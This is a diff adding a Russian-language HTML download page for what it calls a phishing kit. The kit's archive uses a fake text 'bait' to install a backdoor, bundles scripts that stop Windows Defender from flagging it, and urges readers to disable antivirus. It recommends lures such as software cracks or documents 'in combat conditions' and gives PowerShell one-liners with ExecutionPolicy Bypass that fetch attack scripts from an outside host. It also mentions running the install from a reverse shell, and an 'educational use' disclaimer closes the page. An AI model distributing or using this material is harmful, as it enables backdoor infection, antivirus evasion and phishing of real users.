@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Download files</title>
+		<meta http-equiv="content-type" content="text/html; charset=utf-8">
+	</head>
+	<body>
+		<h1>Загрузка файлов</h1>
+		<p><strong>Внимание!!!</strong> Антивирусы могут определять этот набор файлов как содержащие вирус. Запускайте скрипты при отключённом антивирусе или добавьте исключения антивируса. Для добавления исключений антивируса можно использовать ссылку на первый скачиваемый архив.</p>
+		<p><strong>Внимание!</strong> Здесь приведены только скрипты загрузки архивов. Для их распаковки и запуска скриптов может потребоваться графическая оболочка.</p>
+		<p>&nbsp;</p>
+		<p>На данной странице находится пример архива с фейковой «приманкой», содержащий установку бэкдора для установки админ-пака «Экспонета» методом фишинга. Загрузить архив можно по ссылкам ниже. После загрузки файл распаковывается, и запускается командный файл, обрабатывающий запароленный самораспаковывающийся архив. После распаковки и установки бэкдора  к компьютеру возможно применение троянцев удалённого доступа и других троянцев, распространяемых в том числе с помощью документов Microsoft Word с макросами.</p>
+		<p>В качестве тестовой приманки используется текстовый файл, запускаемый в редакторе notepad. В боевых условиях настоятельно рекомендуется вместо этого использовать «полезные» файлы в виде документации, презентаций, кряков программ, рисунков, видео, слайд-шоу и т.п.</p>
+		<p>&nbsp;</p>
+		<p>На этой странице предлагается загрузка следующих файлов:</p>
+		<ul>
+			<li><a href="http://distrib.netip6.ru/NIT/KMS/download.php?file=DefenderScripts.zip">DefenderScripts.zip</a> — Набор скриптов для управления антивирусом Microsoft Windows Defender и предотвращения его ложного срабатывания при установки бэкдора.</li>
+			<li><a href="http://distrib.netip6.ru/NIT/KMS/download.php?file=Dn.KMS.scripts.wsf">Dn.KMS.scripts.wsf</a> — Скрипт для полуатоматической загрузки скриптов для скачивания архива выше (смотри файл <a href="http://distrib.netip6.ru/NIT/KMS/download.html" target="_blank">Загрузки KMS активатора.</a>).</li>
+			<li><a href="http://distrib.netip6.ru/NIT/NIT-SilentInstalls/MainExample/download.php?file=mainexample.zip">mainexample.zip</a> — Архив, содержащий самораспаковывающийся архив со скриптами бэкдора (запароленнывй на всякий случай), собственно текст-приманку и программу для распаковки архива и запуска приманки и установленного бэкдора. Архив без пароля!.</li>
+			<li><a href="http://distrib.netip6.ru/NIT/NIT-SilentInstalls/MainExample/download.php?file=nit-silentinstall.mainexample.scripts.download.cmd">nit-silentinstall.mainexample.scripts.download.cmd</a> — Скрипт для полуатоматической загрузки второго архива (смотри файл markdown).</li>
+		</ul>
+		<p>Файлы реализуют различные функции на удалённом компьютере.</p>
+		<p>После загрузки файлов распакуйте архив, и выполните действия, описанные в инструкции.</p>
+		<p><strong>Примечание</strong>. Для загрузки скрипта .cmd можно использовать следующий код powershell:</p>
+		<p><code>powershell.exe -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command "((new-object System.Net.WebClient).DownloadFile('http://distrib.netip6.ru/NIT/NIT-SilentInstalls/MainExample/nit-silentinstall.mainexample.scripts.download.cmd', '$env:USERPROFILE\nit-silentinstall.mainexample.scripts.download.cmd'))"</code></p>
+		<p><strong>Примечание</strong>. Для загрузки скрипта .WSF можно использовать следующий код powershell:</p>
+		<p><code>powershell.exe -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command "((new-object System.Net.WebClient).DownloadFile('http://distrib.netip6.ru/NIT/KMS/Dn.KMS.scripts.wsf', '$env:USERPROFILE\Dn.KMS.scripts.wsf'))"</code></p>
+		<h3>Распаковка архива в командной строке</h3>
+		<p>Для распаковки указанных архивов в командной строке PowerShell 5.1+ можно использовать командлет <code>Expand-Archive</code>:</p>
+		<pre>
+Expand-Archive
+      [-Path] <String>
+      [[-DestinationPath] <String>]
+      [-Force]
+      [-PassThru]
+      [-WhatIf]
+      [-Confirm]
+      [<CommonParameters>]
+	  	</pre>
+	  	<p>или</p>
+		<pre>
+Expand-Archive
+      -LiteralPath <String>
+      [[-DestinationPath] <String>]
+      [-Force]
+      [-PassThru]
+      [-WhatIf]
+      [-Confirm]
+      [<CommonParameters>]		
+		</pre>
+		<p>где строка <code>-Path</code> или <code>-LiteralPath</code> определяет полный путь к распаковываему архиву, а необязательный строковый параметр <code>-DestinationPath</code> задаёт каталог, в который распаковывается архив. Таким образом можно запустить установку бэкдора из-под реверс-шелл.</p>
+		<h2>Замечание о применении бэкдора</h2>
+		<p>Используйте даннную программу только в образовательных, некоммерческих целях, а также для администрирования компьютеров под управлением Microsoft Windows вне критической инфраструктуры! Любое злонамеренное использование данной программы преследуется по закону! Использование спама и фишинга также преследуется по закону.</p>
+		<p>&nbsp;</p>
+	</body>
+</html>
